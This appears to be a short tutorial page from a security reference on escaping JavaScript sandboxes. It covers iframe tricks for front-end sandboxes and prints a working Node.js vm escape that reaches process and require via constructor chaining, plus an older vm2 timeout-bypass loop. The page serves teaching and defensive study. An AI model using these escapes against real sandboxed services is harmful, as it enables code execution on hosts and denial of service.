sandbox escape
========================================

Front-end sandbox
----------------------------------------
In the front end, you may use methods such as deleting ``eval`` and rewriting ``Function.prototype.constructor`` / ``GeneratorFunction`` / ``AsyncFunction`` to complete the front-end sandbox. In this case, you can use the method of creating a new iframe to obtain a new execution environment.

Server sandbox
----------------------------------------
JavaScript provides a native vm module to isolate the code context. However, the standard JavaScript API and the global NodeJS environment can still be accessed in this environment.

In native sandbox modules, commonly used escape methods are:

.. code-block:: javascript

    const vm = require('vm');
    const sandbox = {};
    const whatIsThis = vm.runInNewContext(`
        const ForeignObject = this.constructor;
        const ForeignFunction = ForeignObject.constructor;
        const process = ForeignFunction("return process")();
        const require = process.mainModule.require;
        require("fs");
    `, sandbox);


Considering the shortcomings of JavaScript's native vm module, some developers designed vm2 to provide a safer isolation environment, but there are also some escape methods in older versions, such as:

.. code-block:: javascript

    vm.runInNewContext(
      'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
      {console:{log(){console.log.apply(console,arguments);}}},
      {timeout:5}
    );
